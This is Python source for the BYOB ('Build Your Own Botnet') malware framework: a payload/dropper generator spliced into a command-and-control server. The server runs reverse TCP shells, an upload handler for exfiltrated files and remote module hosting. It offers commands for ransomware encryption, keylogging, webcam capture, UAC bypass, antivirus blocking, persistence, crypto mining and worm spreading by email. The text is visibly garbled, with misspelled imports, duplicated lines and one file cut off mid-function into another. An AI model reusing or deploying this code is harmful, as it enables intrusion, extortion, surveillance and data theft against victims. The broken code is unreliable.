   #!/usr/bin/pithon
              import sockert
               import sys  #moduli
                import os
                import socket
                import sys
                import threading
                import struct
                import time
                __all__ = ['client','core','modules','server']
                __version__ = '1.0'
                __license__ = 'GPLv3'
                __github__ = 'https://github.com/malwaredllc/byob'
                 import os
                import sys
                 import zlib
                import base64
                import random
                import marshal
                import argparse
                import itertools
                import threading
if sys.version_info[0] < 3:
    from urllib2 import urlparse
    from urllib import pathname2url
else:
    from urllib import parse as urlparse
    from urllib.request import pathname2url
    sys.path.append('core')

# packages
import colorama

# modules
import core.util as util
import core.security as security
import core.generators as generators

# globals
colorama.init(autoreset=True)
__banner = """

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8' zz 8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'
"""

# main
def main():
    """
    Run the generator

    """
    util.display(globals()['__banner'], color=random.choice(list(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore)))), style='normal')

    parser = argparse.ArgumentParser(
        prog='client.py',
        description="Generator (Build Your Own Botnet)"
    )

    parser.add_argument('host',
                        action='store',
                        type=str,
                        help='server IP address')

    parser.add_argument('port',
                        action='store',
                        type=str,
                        help='server port number')

    parser.add_argument('modules',
                        metavar='module',
                        action='append',
                        nargs='*',
                        help='module(s) to remotely import at run-time')

    parser.add_argument('--name',
                        action='store',
                        help='output file name')

    parser.add_argument('--icon',
                        action='store',
                        help='icon image file name')

    parser.add_argument('--pastebin',
                        action='store',
                        metavar='API',
                        help='upload the payload to Pastebin (instead of the C2 server hosting it)')

    parser.add_argument('--encrypt',
                        action='store_true',
                        help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                        default=False)

    parser.add_argument('--compress',
                        action='store_true',
                        help='zip-compress into a self-extracting python script',
                        default=False)

    parser.add_argument('--freeze',
                        action='store_true',
                        help='compile client into a standalone executable for the current host platform',
                        default=False)

    parser.add_argument('--debug',
                        action='store_true',
                        help='enable debugging output for frozen executables',
                        default=False
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    options = parser.parse_args()
    key = base64.b64encode(os.urandom(16))
    var = generators.variable(3)
    modules = _modules(options, var=var, key=key)
    imports = _imports(options, var=var, key=key, modules=modules)
    hidden  = _hidden (options, var=var, key=key, modules=modules, imports=imports)
    payload = _payload(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden)
    stager  = _stager (options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=payload)
    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)
    return dropper

def _update(input, output, task=None):
    diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')

def _modules(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display('Modules', color='reset', style='bright')
    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')

    global __load__
    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    modules = ['core/util.py','core/security.py','core/payloads.py', 'core/miner.py']
    

    if len(options.modules):
        for m in options.modules:
            if isinstance(m, str):
                base = os.path.splitext(os.path.basename(m))[0]
                if not os.path.exists(m):
                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        util.display("[-]", color='red', style='normal')
                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                modules.append(module)
    __load__.set()
    util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
    return modules

def _imports(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Imports", color='reset', style='bright')

    assert 'modules' in kwargs, "missing keyword argument 'modules'"

    util.display("\tAdding imports...", color='reset', style='normal', end=' ')
    #!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (Build Your Own Botnet)'
from __future__ import print_function

# standard library
import os
import sys
import time
import json
import base64
import pickle
import socket
import struct
import random
import inspect
import argparse
import datetime
import threading
import subprocess
import collections

http_serv_mod = "SimpleHTTPServer"
if sys.version_info[0] > 2:
    http_serv_mod = "http.server"
    sys.path.append('core')
    sys.path.append('modules')

# modules
import core.util as util
import core.database as database
import core.security as security

# packages
try:
    import cv2
except ImportError:
    util.log("Warning: missing package 'cv2' is required for 'webcam' module")
try:
    import colorama
except ImportError:
    sys.exit("Error: missing package 'colorama' is required")

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# globals
__threads = {}
__abort = False
__debug = False
__banner__ = """

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""

# main
def main():

    parser = argparse.ArgumentParser(
        prog='server.py',
        description="Command & Control Server (Build Your Own Botnet)"
    )

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--database',
        action='store',
        type=str,
        default='database.db',
        help='SQLite database')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Additional logging'
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    modules = os.path.abspath('modules')
    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']

    if len(site_packages):
        n = 0
        globals()['packages'] = site_packages[0]
        for path in site_packages:
            if n < len(os.listdir(path)):
                n = len(os.listdir(path))
                globals()['packages'] = path
    else:
        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
        sys.exit(0)

    if not os.path.isdir('data'):
        try:
            os.mkdir('data')
        except OSError:
            util.log("Unable to create directory 'data' (permission denied)")

    options = parser.parse_args()
    tmp_file=open("temp","w")
    
    globals()['debug'] = options.debug

    # host Python packages on C2 port + 2 (for clients to remotely import)
    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)

    # host BYOB modules on C2 port + 1 (for clients to remotely import)
    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)

    # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)

    # run C2
    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
    globals()['c2'].run()


class C2():
    """
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients

    """

    _lock = threading.Lock()
    _text_color = 'WHITE'
    _text_style = 'NORMAL'
    _prompt_color = 'WHITE'
    _prompt_style = 'BRIGHT'

    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        """
        Create a new Command & Control server

        `Optional`
        :param str db:      SQLite database
                                :memory: (session)
                                *.db     (persistent)

        Returns a byob.server.C2 instance

        """
        self._active = threading.Event()
        self._count = 0
        self._prompt = None
        self._database = db
        self.child_procs = {}
        self.current_session = None
        self.sessions = {}
        self.socket = self._socket(port)
        self.banner = self._banner()
        self.commands = {
            'set' : {
                'method': self.set,
                'usage': 'set <setting> [option=value]',
                'description': 'change the value of a setting'},
            'help' : {
                'method': self.help,
                'usage': 'help',
                'description': 'show usage help for server commands'},
            'exit' : {
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'},
            'debug' : {
                'method': self.debug,
                'usage': 'debug <code>',
                'description': 'run python code directly on server (debugging MUST be enabled)'},
            'query' : {
                'method': self.query,
                'usage': 'query <statement>',
                'description': 'query the SQLite database'},
            'options' : {
                'method': self.settings,
                'usage': 'options',
                'description': 'show currently configured settings'},
            'sessions' : {
                'method': self.session_list,
                'usage': 'sessions',
                'description': 'show active client sessions'},
            'clients' : {
                'method': self.client_list,
                'usage': 'clients',
                'description': 'show all clients that have joined the server'},
            'shell' : {
                'method': self.session_shell,
                'usage': 'shell <id>',
                'description': 'interact with a client with a reverse TCP shell through an active session'},
            'ransom' : {
                'method': self.session_ransom,
                'usage': 'ransom [id]',
                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
            'webcam' : {
                'method': self.session_webcam,
                'usage': 'webcam <mode>',
                'description': 'capture image/video from the webcam of a client device'},
            'kill' : {
                'method': self.session_remove,
                'usage': 'kill <id>',
                'description': 'end a session'},
            'bg' : {
                'method': self.session_background,
                'usage': 'bg [id]',
                'description': 'background a session (default: the current session)'},
            'broadcast' : {
                'method': self.task_broadcast,
                'usage': 'broadcast <command>',
                'description': 'broadcast a task to all active sessions'},
            'results': {
                'method': self.task_list,
                'usage': 'results [id]',
                'description': 'display all completed task results for a client (default: all clients)'},
            'tasks' : {
                'method': self.task_list,
                'usage': 'tasks [id]',
                'description': 'display all incomplete tasks for a client (default: all clients)'},
            'abort': {
                'method': 'you must first connect to a session to use this command',
                'description': 'abort execution and self-destruct',
                'usage': 'abort'},
            'cat': {
                'method': 'you must first connect to a session to use this command',
                'description': 'display file contents', 
                'usage': 'cat <path>'},
            'cd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'change current working directory',
                'usage': 'cd <path>'},
            'escalate': {
                'method': 'you must first connect to a session to use this command',
                'description': 'attempt uac bypass to escalate privileges',
                'usage': 'escalate'},
            'eval': {
                'method': 'you must first connect to a session to use this command',
                'description': 'execute python code in current context',
                'usage': 'eval <code>'},
            'execute': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run an executable program in a hidden process',
                'usage': 'execute <path> [args]'},
            'help': {
                'method': self.help,
                'description': 'show usage help for commands and modules',
                'usage': 'help [cmd]'},
            'icloud': {
                'method': 'you must first connect to a session to use this command',
                'description': 'check for logged in icloud account on macos',
                'usage': 'icloud'},
            'keylogger': {
                'method': 'you must first connect to a session to use this command',
                'description': 'log user keystrokes',
                'usage': 'keylogger [mode]'},
            'load': {
                'method': 'you must first connect to a session to use this command',
                'description': 'remotely import a module or package',
                'usage': 'load <module> [target]'},
            'ls': {
                'method': 'you must first connect to a session to use this command',
                'description': 'list the contents of a directory',
                'usage': 'ls <path>'},
            'miner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run cryptocurrency miner in the background',
                'usage': 'miner <url> <user> <pass>'},
            'outlook': {
                'method': 'you must first connect to a session to use this command',
                'description': 'access outlook email in the background',
                'usage': 'outlook <option> [mode]'},
            'packetsniffer': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture traffic on local network',
                'usage': 'packetsniffer [mode]'},
            'passive': {
                'method': 'you must first connect to a session to use this command',
                'description': 'keep client alive while waiting to re-connect',
                'usage': 'passive'},
            'persistence': {
                'method': 'you must first connect to a session to use this command',
                'description': 'establish persistence on client host machine',
                'usage': 'persistence <add/remove> [method]'},
            'portscanner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'scan a target host or network to identify',
                'usage': 'portscanner <target>'},
            'process': {
                'method': 'you must first connect to a session to use this command',
                'description': 'block process (e.g. antivirus) or monitor process',
                'usage': 'process <block/monitor>'},
            'pwd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show name of present working directory',
                'usage': 'pwd'},
            'restart': {
                'method': 'you must first connect to a session to use this command',
                'description': 'restart the shell', 
                'usage': 'restart [output]'},
            'screenshot': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture a screenshot from host device',
                'usage': 'screenshot'},
            'show': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show value of an attribute',
                'usage': 'show <value>'},
            'spread': {
                'method': 'you must first connect to a session to use this command',
                'description': 'activate worm-like behavior and begin spreading client via email',
                'usage': 'spread <gmail> <password> <URL email list>'},
            'stop': {
                'method': 'you must first connect to a session to use this command',
                'description': 'stop a running job', 
                'usage': 'stop <job>'},
            'upload': {
                'method': 'you must first connect to a session to use this command',
                'description': 'upload file from client machine to the c2 server',
                'usage': 'upload [file]'},
            'wget': {
                'method': 'you must first connect to a session to use this command',
                'description': 'download file from url', 
                'usage': 'wget <url>'}        
        }

        try:
            import readline
        except ImportError:
            util.log("Warning: missing package 'readline' is required for tab-completion")
        else:
            import rlcompleter
            readline.parse_and_bind("tab: complete")
            readline.set_completer(self._completer)

    def _print(self, info):
        lock = self.current_session._lock if self.current_session else self._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        try:
                            info[key] = json.loads(key)
                            self._print(info[key])
                        except:
                            if len(str(info.get(key))) > 80:
                                info[key] = str(info.get(key))[:77] + '...'
                            info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
                            util.display('\x20' * 4, end=' ')
                            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                util.display('\x20' * 4, end=' ')
                util.display(str(info), color=self._text_color, style=self._text_style)

    def _socket(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(100)
        return s

    def _return(self, data=None):
        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                util.display('\n{}\n'.format(data))
            util.display(prompt, end=' ')

    def _banner(self):
        with self._lock:
            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
            util.display("[?] ", color='yellow', style='bright', end=' ')
            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
        return __banner__

    def _get_arguments(self, data):
        args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)

    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            util.log("Invalid Client ID")
        return session

    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            peer = connection.getpeername()[0]
            for s in self.get_sessions():
                if s.connection.getpeername()[0] == peer:
                    session = s
                    break
            else:
                util.log("Session not found for: {}".format(peer))
        else:
            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session

    def _completer(self, text, state):
        options = [i for i in self.commands.keys() if i.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())

    def _execute(self, args):
        # ugly method that should be refactored at some point
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.log("{} error: {}".format(self.execute.__name__, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    def debug(self, code):
        """
        Execute code directly in the context of the currently running process

        `Requires`
        :param str code:    Python code to execute

        """
        if globals()['debug']:
            try:
                print(eval(code))
            except Exception as e:
                util.log("Error: %s" % str(e))
        else:
            util.log("Debugging mode is disabled")

    def quit(self):
        """
        Quit server and optionally keep clients alive

        """

        # terminate handlers running on other ports
        globals()['package_handler'].terminate()
        globals()['module_handler'].terminate()
        globals()['post_handler'].terminate()

        # kill subprocesses (subprocess.Popen)
        for proc in self.child_procs.values():
            try:
                proc.kill()
            except: pass

        # kill child processes (multiprocessing.Process)
        for child_proc in self.child_procs.values():
            try:
                child_proc.terminate()
            except: pass
        
        # kill clients or keep alive (whichever user specifies)
        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
            for session in self.sessions.values():
                if isinstance(session, Session):
                    try:
                        session._active.set()
                        session.send_task({"task": "passive"})
                    except: pass
        globals()['__abort'] = True
        self._active.clear()

        # kill server and exit
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        util.display('Exiting...')
        sys.exit(0)

    def help(self, cmd=None):
        """
        Show usage information

        `Optional`
        :param str info:   client usage help

        """
        column1 = 'command <arg>'
        column2 = 'description'

        # if a valid command is specified, display detailed help for it.
        # otherwise, display help for all commands
        if cmd:
            if cmd in self.commands:
                info = {self.commands[cmd]['usage']: self.commands[cmd]['description']} 
            else:
                util.display("'{cmd}' is not a valid command. Type 'help' to see all commands.".format(cmd=cmd))
                return
        else:
            info = {command['usage']: command['description'] for command in self.commands.values()}

        max_key = max(map(len, list(info.keys()) + [column1])) + 2
        max_val = max(map(len, list(info.values()) + [column2])) + 2
        util.display('\n', end=' ')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        util.display("\n", end=' ')


    def display(self, info):
        """
        Display formatted output in the console

        `Required`
        :param str info:   text to display

        """
        with self._lock:
            print()
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self._print(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            elif isinstance(info, bytes):
                try:
                    self._print(json.load(info))
                except:
                    util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
            else:
                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
            print()

    def query(self, statement):
        """
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute

        """
        self.database.execute_query(statement, returns=False, display=True)

    def settings(self):
        """
        Show the server's currently configured settings

        """
        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
        util.display('\n\t    OPTIONS', color='white', style='bright')
        util.display('text color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
        util.display('prompt color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
        util.display('debug: ', color='white', style='normal', end=' ')
        util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')

    def set(self, args=None):
        """
        Set display settings for the command & control console

        Usage: `set [setting] [option]=[value]`

            :setting text:      text displayed in console
            :setting prompt:    prompt displayed in shells

            :option color:      color attribute of a setting
            :option style:      style attribute of a setting

            :values color:      red, green, cyan, yellow, magenta
            :values style:      normal, bright, dim

        Example 1:         `set text color=green style=normal`
        Example 2:         `set prompt color=white style=bright`

        """
        if args:
            arguments = self._get_arguments(args)
            args, kwargs = arguments.args, arguments.kwargs
            if arguments.args:
                target = args[0]
                args = args[1:]
                if target in ('debug','debugging'):
                    if args:
                        setting = args[0]
                        if setting.lower() in ('0','off','false','disable'):
                            globals()['debug'] = False
                        elif setting.lower() in ('1','on','true','enable'):
                            globals()['debug'] = True
                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
                        util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
                        return
                for setting, option in arguments.kwargs.items():
                    option = option.upper()
                    if target == 'prompt':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._prompt_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._prompt_style = option
                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                        return
                    elif target == 'text':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._text_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._text_style = option
                        util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
                        util.display(option + '\n', color=self._text_color, style=self._text_style)
                        return
        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)

    def task_list(self, id=None):
        """
        List client tasks and results

        `Requires`
        :param int id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        tasks = self.database.get_tasks()
        with lock:
            print()
            for task in tasks:
                util.display(tasks.index(task) + 1)
                self.database._display(task)
            print()

    def task_broadcast(self, command):
        """
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        sessions = self.sessions.values()
        send_tasks = [session.send_task({"task": command}) for session in sessions]
        recv_tasks = {session: session.recv_task() for session in sessions}
        for session, task in recv_tasks.items():
            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
                session._prompt = task.get('result')
            elif task.get('result'):
                self.display(task.get('result'))
        self._return()

    def session_webcam(self, args=''):
        """
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video

        """
        if not self.current_session:
            util.log( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = {"task": 'webcam stream {}'.format(port)}
                    client.send_task(cmd)
                    conn, addr = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                result = 'Webcam stream ended'
        else:
            client.send_task({"task": "webcam %s" % args})
            task = client.recv_task()
            result = task.get('result')
            client._active.set()
        return result

    def session_remove(self, session_id):
        """
        Shutdown client shell and remove client from database

        `Requires`
        :param int session_id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session_id).isdigit() or int(session_id) not in self.sessions:
            return
        elif str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
            session = self.sessions[int(session_id)]
            util.display("Session '{}' is stale (Awaiting Connection)".format(session_id))
            _ = self.sessions.pop(int(session_id), None)
            self.database.update_status(session['info']['uid'], 0)
            with self._lock:
                util.display('Session {} expunged'.format(session_id))
            self._active.set()
            return self.run()
        else:
            # select session
            session = self.sessions[int(session_id)]
            session._active.clear()
            # send kill command to client
            try:
                session.send_task({"task": "kill", "session": session.info.get('uid')})
                # shutdown the connection
                session.connection.shutdown(socket.SHUT_RDWR)
                session.connection.close()
                # update current sessions
            except: pass
            _ = self.sessions.pop(int(session_id), None)
            # update persistent database
            self.database.update_status(session.info.get('uid'), 0)
            if self.current_session != None and int(session_id) != self.current_session.id:
                with self.current_session._lock:
                    util.display('Session {} disconnected'.format(session_id))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()
            else:
                self.current_session = None
                with self._lock:
                    util.display('Session {} disconnected'.format(session_id))
                self._active.set()
                session._active.clear()
                return self.run()

    def client_list(self, verbose=True):
        """
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            sessions = self.database.get_sessions(verbose=verbose)
            self.database._display(sessions)
            print()

    def session_list(self):
        """
        List active sessions

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            for ses in self.sessions.values():
                util.display(str(ses.id), color='white', style='normal')
                self.database._display(ses.info)
                print()

    def session_ransom(self, args=None):
        """
        Encrypt and ransom files on client machine

        `Required`
        :param str args:    encrypt, decrypt, payment

        """
        if self.current_session:
            if 'decrypt' in str(args):
                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
            elif 'encrypt' in str(args):
                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
            else:
                self.current_session.send_task({"task": "ransom {}".format(args)})
        else:
            util.log("No client selected")

    def session_shell(self, session):
        """
        Interact with a client session through a reverse TCP shell

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session).isdigit() or int(session) not in self.sessions:
            util.display("Session {} does not exist".format(session))
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
            self.current_session._active.set()
            return self.current_session.run()

    def session_background(self, session=None):
        """
        Send a session to background

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()
        return self.run()

    @util.threaded
    def serve_until_stopped(self):
        self.database = database.Database(self._database)
        for session_info in self.database.get_sessions(verbose=True):
            self.database.update_status(session_info.get('uid'), 0)
            session_info['online'] = False
        while True:
            connection, address = self.socket.accept()
            session = Session(connection=connection, id=self._count)
            if session.info != None:
                info = self.database.handle_session(session.info)
                if isinstance(info, dict):
                    self._count += 1
                    if info.pop('new', False):
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
